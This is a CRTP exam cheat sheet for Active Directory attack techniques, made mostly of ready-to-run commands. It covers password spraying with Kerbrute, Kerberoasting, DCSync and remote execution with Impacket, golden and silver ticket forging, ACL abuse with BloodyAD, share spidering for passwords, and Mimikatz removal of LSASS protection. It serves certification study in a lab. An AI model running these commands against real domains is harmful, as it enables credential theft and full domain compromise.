# 00 — Quick Reference & Exam Command Cheat Sheet

> [!TIP]
> **Exam Strategy:** Replace placeholders (`<DOMAIN>`, `<USER>`, `<TARGET>`, `<AES256_KEY>`, `<DOMAIN_SID>`, `<KRBTGT_AES256>`, `<ENTERPRISE_ADMIN_SID>`) with your lab/exam values.

---

## CRTP Master Attack Flow

```text
              INITIAL ACCESS
                     │
                     ▼
              whoami /all
              hostname
              ipconfig /all
                     │
                     ▼
             DOMAIN ENUMERATION
                     │
      ┌──────────────┼──────────────┐
      ▼              ▼              ▼
    USERS          GROUPS       COMPUTERS
      │              │              │
      └──────────────┼──────────────┘
                     ▼
              OU / GPO / ACL
                     │
                     ▼
                  TRUSTS
                     │
                     ▼
           LOCAL ADMIN ACCESS?
                /         \
              YES          NO
               │            │
               ▼            ▼
        SESSION HUNT     ACL/GPO/DELEGATION
               │            │
               └─────┬──────┘
                     ▼
             CREDENTIAL ACCESS
                     │
          ┌──────────┼───────────┐
          ▼          ▼           ▼
        LSASS      FILES      KERBEROS
          │          │           │
          └──────────┼───────────┘
                     ▼
              OPTH / PTT / S4U
                     │
                     ▼
             LATERAL MOVEMENT
                     │
                     ▼
                DOMAIN ADMIN
                     │
                     ▼
                  DCSYNC
                     │
                     ▼
             DOMAIN DOMINANCE
                     │
                     ▼
              TRUST ENUMERATION
                     │
                     ▼
             CROSS-TRUST ATTACK
                     │
                     ▼
             ENTERPRISE ADMIN
```

---

## Ticket Comparison Matrix

| Ticket Type | Required Secret | Issuer | Target Scope | Key Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Golden Ticket** | `krbtgt` password hash / AES256 key | Forged offline (KDC bypassed) | Entire Domain (Domain Admin) | Complete domain persistence and full access to all domain hosts. |
| **Silver Ticket** | Target Service Account hash / AES key | Forged offline | Specific Service / Host (e.g. CIFS, HTTP, WMI) | Stealthy access to specific service without contacting DC. |
| **Diamond Ticket** | `krbtgt` AES256 key + valid TGT | Real KDC (signed PAC modified) | Entire Domain (Domain Admin) | Bypass TGT request anomaly detection by modifying PAC of a real TGT. |
| **S4U2Self / S4U2Proxy** | Delegation Account hash / AES key | Real KDC | Allowed downstream SPN (`msDS-AllowedToDelegateTo`) | Impersonate any user (e.g. Administrator) to delegated services. |
| **Overpass-the-Hash (OPTH)** | User NTLM hash / AES256 key | Real KDC | Target User permissions | Obtain valid Kerberos TGT without knowing plaintext password. |

---

## PowerView vs. ActiveDirectory Module

| Action | PowerView | AD Module |
| :--- | :--- | :--- |
| **Current Domain** | `Get-Domain` | `Get-ADDomain` |
| **Domain Controllers** | `Get-DomainController` | `Get-ADDomainController` |
| **All Users** | `Get-DomainUser` | `Get-ADUser -Filter *` |
| **Specific User** | `Get-DomainUser -Identity <USER>` | `Get-ADUser -Identity <USER> -Properties *` |
| **Kerberoastable SPNs** | `Get-DomainUser -SPN` | `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` |
| **AdminCount Users** | `Get-DomainUser -AdminCount` | `Get-ADUser -Filter {AdminCount -eq 1}` |
| **Domain Computers** | `Get-DomainComputer` | `Get-ADComputer -Filter * -Properties *` |
| **Domain Groups** | `Get-DomainGroup` | `Get-ADGroup -Filter *` |
| **Group Members** | `Get-DomainGroupMember -Identity <GROUP>` | `Get-ADGroupMember -Identity <GROUP>` |
| **OUs** | `Get-DomainOU` | `Get-ADOrganizationalUnit -Filter *` |
| **GPOs** | `Get-DomainGPO` | `Get-ADGPO -All` |
| **Domain Trusts** | `Get-DomainTrust` | `Get-ADTrust -Filter *` |
| **Forest Trusts** | `Get-ForestTrust` | `Get-ADForest \| %{ Get-ADTrust -Filter * }` |
| **Object ACLs** | `Get-DomainObjectAcl -Identity <NAME>` | `(Get-ACL 'AD:\CN=...').Access` |

---

## ACL Privilege Abuse Matrix

| Privilege | Impact | Command |
| :--- | :--- | :--- |
| **GenericAll** | Full control | Modify group membership, reset password, shadow credentials |
| **GenericWrite** | Update attributes | `Set-DomainObject -Identity <TARGET> -Set @{'scriptpath'='...'}` |
| **WriteDacl** | Modify DACL | `Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All` |
| **WriteOwner** | Take ownership | `Set-DomainObjectOwner -TargetIdentity <TARGET> -PrincipalIdentity <USER>` |
| **ForceChangePassword** | Reset password | `Set-ADAccountPassword -Identity <USER> -Reset -NewPassword (ConvertTo-SecureString 'P@ss!' -AsPlainText -Force)` |
| **AddMembers** | Add to group | `Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'` |
| **DCSync** | Replicate hashes | `lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt` |

---

## NetExec (nxe / cme) — Initial SMB Enumeration

```bash
# Check SMB signing (find hosts with signing disabled for relaying)
nxe smb <TARGET_IP_OR_RANGE> --gen-relay-list hosts.txt

# Null session & Guest session share enumeration
nxe smb <TARGET_IP> -u '' -p '' --shares
nxe smb <TARGET_IP> -u 'Guest' -p '' --shares

# Authenticated share listing & logged-on users
nxe smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --shares --loggedon-users

# Spider shares for password/config files
nxe smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --spider "C$" --pattern "unattend*,*.kdbx,*.config,pass*"
```

---

## Kerbrute — User Enumeration & Password Spraying

```bash
# Enumerate valid usernames against DC
kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt

# Password spray a single password against all users
kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt 'Password123!'

# Brute-force a single user
kerbrute bruteuser --dc <DC_IP> -d <DOMAIN> passwords.txt <USER>
```

---

## Impacket Quick Reference

```bash
# Kerberoasting
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# AS-REP Roasting
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt

# DCSync / Secret Dump
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
impacket-secretsdump <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH> -just-dc-ntlm

# Remote Execution (with password or hash)
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
impacket-smbexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
impacket-atexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET> "whoami"

# Golden Ticket & Cross-Trust Ticket
impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator
impacket-ticketer -nthash <TRUST_KEY_NTLM> -domain-sid <CHILD_SID> -domain <CHILD_DOMAIN> -extra-sid <ENTERPRISE_ADMIN_SID> Administrator

# RBCD
impacket-rbcd <DOMAIN>/<USER>:<PASSWORD> -delegate-to <TARGET>$ -delegate-from FakeMachine$ -dc-ip <DC_IP> -action write
impacket-getST <DOMAIN>/FakeMachine$:'P@ss!' -spn cifs/<TARGET> -impersonate Administrator -dc-ip <DC_IP>

# Silver Ticket
impacket-ticketer -spn cifs/<TARGET_FQDN> -nthash <SERVICE_NTLM> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator
```

---

## Bloody-AD — ACL & Object Manipulation

```bash
# Add user to group
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>'

# Set password (ForceChangePassword)
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> set password '<TARGET_USER>' 'NewP@ss123!'

# Grant DCSync rights
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> add dcsync '<TARGET_USER>'

# Add GenericAll on object
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> add genericAll 'OU=<TARGET_OU>' '<TARGET_USER>'

# Set owner
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> set owner '<TARGET_OBJECT>' '<TARGET_USER>'

# RBCD — set msDS-AllowedToActOnBehalfOfOtherIdentity
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> add rbcd '<TARGET_COMPUTER>$' 'FakeMachine$'

# Read GMSA password
bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> get object '<GMSA_ACCOUNT>$' --attr msDS-ManagedPassword
```

---

## Command Troubleshooting — "Command Failed? Try This"

| Symptom / Error | Probable Cause | Fix / Alternative Command |
| :--- | :--- | :--- |
| **WinRM `Access Denied` / 0x8009030e** | User not Local Admin or WinRM service restricted | Use WMI (`Invoke-WmiMethod`), PsExec (`sc.exe`), or check `Get-NetLocalGroupMember`. |
| **PowerView `Get-Domain` returns null** | Script not dot-sourced or domain unresolvable | Execute `. .\PowerView.ps1` (include dot-space) or specify `-Domain <FQDN> -Server <DC_IP>`. |
| **Rubeus `KrbException: KRB_AP_ERR_SKEW`** | System clock out of sync with DC | Sync clock: `net time \\<DC_IP> /set /y` or `w32tm /resync`. |
| **DCSync `RPC_S_SERVER_UNAVAILABLE`** | DNS resolution failed for DC FQDN | Specify IP address directly or add DC to `C:\Windows\System32\drivers\etc\hosts`. |
| **Kerberos Ticket import ignored** | Session context mismatch | Purge tickets (`klist purge` / `Rubeus.exe purge`), then import with `Rubeus.exe ptt` in elevated prompt. |
| **Mimikatz LSASS `0x00000005 ACCESS DENIED`** | LSA Protection (PPL) enabled | Load driver to remove PPL: `!drv::install mimidrv.sys` then `!processprotect /process:lsass.exe /remove`. |

---

## Credentials & Exam Loot Tracker

Use this Markdown table template during the exam to track compromised credentials:

| Host / Scope | Account / User | Type (Pass/Hash/AES) | Value / Secret | Privilege Level | Usable Protocols | Source |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| `172.16.2.5` | `student1` | Plaintext | `P@ss123!` | Domain User | WinRM, SMB, Kerberos | Initial Access |
| `DC01` | `svc_sql` | NTLM Hash | `2b57...` | Local Admin | WMI, WinRM, OPTH | LSASS Dump |
| `Domain` | `krbtgt` | AES256 Key | `c4d9...` | KDC Master | Golden/Diamond Ticket | DCSync |
